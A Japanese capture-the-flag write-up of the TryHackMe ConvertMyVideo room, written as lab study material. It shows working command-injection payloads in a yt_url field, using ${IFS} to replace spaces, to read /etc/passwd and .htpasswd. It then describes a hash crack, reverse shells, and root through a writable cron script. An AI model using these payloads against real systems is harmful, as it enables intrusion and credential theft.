# ConvertMyVideo CTF

https://tryhackme.com/room/convertmyvideo

## Enumeration

```shell
TARGET=10.201.2.180
sudo bash -c "echo $TARGET   convert.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -sS -p- $TARGET

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```sh
sudo nmap -sS -sV -p22,80 $TARGET

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

### ディレクトリ列挙

```sh
dirb http://$TARGET

---- Scanning URL: http://10.201.2.180/ ----
+ http://10.201.2.180/admin (CODE:401|SIZE:459)                                                                     
==> DIRECTORY: http://10.201.2.180/images/                                                                          
+ http://10.201.2.180/index.php (CODE:200|SIZE:747)                                                                 
==> DIRECTORY: http://10.201.2.180/js/                                                                              
+ http://10.201.2.180/server-status (CODE:403|SIZE:277)                                                             
==> DIRECTORY: http://10.201.2.180/tmp/                                                                             
                                                                                                                    
---- Entering directory: http://10.201.2.180/images/ ----
                                                                                                                    
---- Entering directory: http://10.201.2.180/js/ ----
                                                                                                                    
---- Entering directory: http://10.201.2.180/tmp/ ----
```

/admin はBasic認証。

## convert

YoutubeのビデオIDを入力するGUI。

hoogee と入力したら、次のリクエストが飛んでいた。

```sh
POST / HTTP/1.1
Host: convert.thm
Content-Length: 57
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://convert.thm
Referer: http://convert.thm/
Accept-Encoding: gzip, deflate, br
Accept-Language: ja,en-US;q=0.9,en;q=0.8
Connection: keep-alive

yt_url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3Dhoogee
```

### SSRF

ローカル80ポートに変えてみる。

```http
yt_url=http://localhost:80
```

```json
{"status":1,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nWARNING: Falling back on generic information extractor.\nERROR: Unsupported URL: http:\/\/localhost:80\n","url_orginal":"http:\/\/localhost:80","output":"[generic] localhost:80: Requesting header\n[generic] localhost:80: Downloading webpage\n[generic] localhost:80: Extracting information\n","result_url":"\/tmp\/downloads\/68fefd093a704.mp3"}
```

- Unsupported URL から、何らかのURLのフィルターがかかっていると思われる
- コンバート後のファイルは /tmp/downloads に保存される

URLに youtube.com を入れてみる。

```http
yt_url=http://localhost:80/youtube.com/hogee
```

```json
{"status":1,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nWARNING: Could not send HEAD request to http:\/\/localhost:80\/youtube.com\/hogee: HTTP Error 404: Not Found\nERROR: Unable to download webpage: HTTP Error 404: Not Found (caused by HTTPError()); please report this issue on https:\/\/yt-dl.org\/bug . Make sure you are using the latest version; type  youtube-dl -U  to update. Be sure to call youtube-dl with the --verbose flag and include its complete output.\n","url_orginal":"http:\/\/localhost:80\/youtube.com\/hogee","output":"[generic] hogee: Requesting header\n[generic] hogee: Downloading webpage\n","result_url":"\/tmp\/downloads\/68fefe0151e1f.mp3"}
```

- リクエストが実行され、HTTP404が返ったというエラー出力。
- ダウンロードに youtube-dl を使っている。

kali でテキストファイルをホスト。

```
yt_url=http://10.11.146.32:8000/youtube.com/foo.txt
```

```json
{"status":1,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nWARNING: Falling back on generic information extractor.\nWARNING: URL could be a direct video link, returning it as such.\nERROR: requested format not available\n","url_orginal":"http:\/\/10.11.146.32:8000\/youtube.com\/foo.txt","output":"[generic] foo: Requesting header\n[generic] foo: Downloading webpage\n","result_url":"\/tmp\/downloads\/68feff51dc00a.mp3"}
```

- kaliにリクエストされているが、/tmp/downloads には保存されていなかった。

保存されるのであればPHP等を保存させるのが有効かと思ったが、難しいかもしれない。

### コマンドインジェクション

```
yt_url=;id;
```

id コマンドの結果が出ている。

```json
{"status":127,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nUsage: youtube-dl [OPTIONS] URL [URL...]\n\nyoutube-dl: error: You must provide at least one URL.\nType youtube-dl --help to see a list of all options.\nsh: 1: -f: not found\n","url_orginal":";id;","output":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n","result_url":"\/tmp\/downloads\/68ff047c03bd9.mp3"}
```

引数を渡すようなコマンドはうまくいかない。

```
yt_url=;cat /etc/passwd;
```

```json
{"status":1,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nUsage: youtube-dl [OPTIONS] URL [URL...]\n\nyoutube-dl: error: You must provide at least one URL.\nType youtube-dl --help to see a list of all options.\ncat: invalid option -- 'f'\nTry 'cat --help' for more information.\n","url_orginal":";cat","output":"","result_url":"\/tmp\/downloads\/68ff06dac2fbe.mp3"}
```

スペースの代わりに`${IFS}`を使うことで成功した。

```
yt_url=;cat${IFS}/etc/passwd;
```

```json
{"status":127,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nUsage: youtube-dl [OPTIONS] URL [URL...]\n\nyoutube-dl: error: You must provide at least one URL.\nType youtube-dl --help to see a list of all options.\nsh: 1: \r: not found\nsh: 2: -f: not found\n","url_orginal":";cat${IFS}\/etc\/passwd;\r\n","output":"root:x:0:0:root:\/root:\/bin\/bash\ndaemon:x:1:1:daemon:\/usr\/sbin:\/usr\/sbin\/nologin\nbin:x:2:2:bin:\/bin:\/usr\/sbin\/nologin\nsys:x:3:3:sys:\/dev:\/usr\/sbin\/nologin\nsync:x:4:65534:sync:\/bin:\/bin\/sync\ngames:x:5:60:games:\/usr\/games:\/usr\/sbin\/nologin\nman:x:6:12:man:\/var\/cache\/man:\/usr\/sbin\/nologin\nlp:x:7:7:lp:\/var\/spool\/lpd:\/usr\/sbin\/nologin\nmail:x:8:8:mail:\/var\/mail:\/usr\/sbin\/nologin\nnews:x:9:9:news:\/var\/spool\/news:\/usr\/sbin\/nologin\nuucp:x:10:10:uucp:\/var\/spool\/uucp:\/usr\/sbin\/nologin\nproxy:x:13:13:proxy:\/bin:\/usr\/sbin\/nologin\nwww-data:x:33:33:www-data:\/var\/www:\/usr\/sbin\/nologin\nbackup:x:34:34:backup:\/var\/backups:\/usr\/sbin\/nologin\nlist:x:38:38:Mailing List Manager:\/var\/list:\/usr\/sbin\/nologin\nirc:x:39:39:ircd:\/var\/run\/ircd:\/usr\/sbin\/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):\/var\/lib\/gnats:\/usr\/sbin\/nologin\nnobody:x:65534:65534:nobody:\/nonexistent:\/usr\/sbin\/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:\/run\/systemd\/netif:\/usr\/sbin\/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:\/run\/systemd\/resolve:\/usr\/sbin\/nologin\nsyslog:x:102:106::\/home\/syslog:\/usr\/sbin\/nologin\nmessagebus:x:103:107::\/nonexistent:\/usr\/sbin\/nologin\n_apt:x:104:65534::\/nonexistent:\/usr\/sbin\/nologin\nlxd:x:105:65534::\/var\/lib\/lxd\/:\/bin\/false\nuuidd:x:106:110::\/run\/uuidd:\/usr\/sbin\/nologin\ndnsmasq:x:107:65534:dnsmasq,,,:\/var\/lib\/misc:\/usr\/sbin\/nologin\nlandscape:x:108:112::\/var\/lib\/landscape:\/usr\/sbin\/nologin\npollinate:x:109:1::\/var\/cache\/pollinate:\/bin\/false\nsshd:x:110:65534::\/run\/sshd:\/usr\/sbin\/nologin\ndmv:x:1000:1000:dmv:\/home\/dmv:\/bin\/bash\n","result_url":"\/tmp\/downloads\/68ff09bc05b6a.mp3"}
```

```
yt_url=;ls${IFS}-al;
```

```json
{"status":127,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nUsage: youtube-dl [OPTIONS] URL [URL...]\n\nyoutube-dl: error: You must provide at least one URL.\nType youtube-dl --help to see a list of all options.\nsh: 1: \r: not found\nsh: 2: -f: not found\n","url_orginal":";ls${IFS}-al;\r\n","output":"total 36\ndrwxr-xr-x 6 www-data www-data 4096 Apr 12  2020 .\ndrwxr-xr-x 3 root     root     4096 Apr 12  2020 ..\n-rw-r--r-- 1 www-data www-data  152 Apr 12  2020 .htaccess\ndrwxr-xr-x 2 www-data www-data 4096 Apr 12  2020 admin\ndrwxrwxr-x 2 www-data www-data 4096 Apr 12  2020 images\n-rw-r--r-- 1 www-data www-data 1790 Apr 12  2020 index.php\ndrwxrwxr-x 2 www-data www-data 4096 Apr 12  2020 js\n-rw-rw-r-- 1 www-data www-data  205 Apr 12  2020 style.css\ndrwxr-xr-x 2 www-data www-data 4096 Apr 12  2020 tmp\n","result_url":"\/tmp\/downloads\/68ff0a189d388.mp3"}
```

/admin の中

```
yt_url=;ls${IFS}-al${IFS}./admin;
```

```json
{"status":127,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nUsage: youtube-dl [OPTIONS] URL [URL...]\n\nyoutube-dl: error: You must provide at least one URL.\nType youtube-dl --help to see a list of all options.\nsh: 1: \r: not found\nsh: 2: -f: not found\n","url_orginal":";ls${IFS}-al${IFS}.\/admin;\r\n","output":"total 24\ndrwxr-xr-x 2 www-data www-data 4096 Apr 12  2020 .\ndrwxr-xr-x 6 www-data www-data 4096 Apr 12  2020 ..\n-rw-r--r-- 1 www-data www-data   98 Apr 12  2020 .htaccess\n-rw-r--r-- 1 www-data www-data   49 Apr 12  2020 .htpasswd\n-rw-r--r-- 1 www-data www-data   39 Apr 12  2020 flag.txt\n-rw-rw-r-- 1 www-data www-data  202 Apr 12  2020 index.php\n","result_url":"\/tmp\/downloads\/68ff0a5b52daa.mp3"}
```

Basic認証情報を狙う

```
yt_url=;cat${IFS}./admin/.htpasswd;
```

```json
{"status":127,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nUsage: youtube-dl [OPTIONS] URL [URL...]\n\nyoutube-dl: error: You must provide at least one URL.\nType youtube-dl --help to see a list of all options.\nsh: 1: \r: not found\nsh: 2: -f: not found\n","url_orginal":";cat${IFS}.\/admin\/.htpasswd;\r\n","output":"itsmeadmin:$apr1$[REDACTED]\n","result_url":"\/tmp\/downloads\/68ff0aa08c7a2.mp3"}
```

hashcatでパスワードクラックに成功してログインできた。

ログインしたら Clean Download ボタンがあり、下記のような実装。

```html
Done :)
<a href="/admin/?c=rm -rf /var/www/html/tmp/downloads">
   <button>Clean Downloads</button>
</a>
```

Pythonのワンライナーリバースシェルが成功した。

```sh
$ nc -lnvp 8888
listening on [any] 8888 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.27.72] 49784
$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 権限昇格

shファイルを検索したら1つだけ気になるものがあった。

```sh
www-data@dmv:/var/www/html$ ls -al /var/www/html/tmp/clean.sh
-rw-r--r-- 1 www-data www-data 17 Apr 12  2020 /var/www/html/tmp/clean.sh
```

これにリバースシェルを追加したら、rootシェルを取れた。

```sh
$ nc -lnvp 8889
listening on [any] 8889 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.27.72] 42620
# id
id
uid=0(root) gid=0(root) groups=0(root)
```

## 振り返り

- コマンドインジェクションは前後にセミコロンを入れなければ動作せず、気づくのが難しかった。
- 最後のリバースシェルは当てずっぽうだったが、pspyを使えばシェルを実行していることは確認できたと思われる。
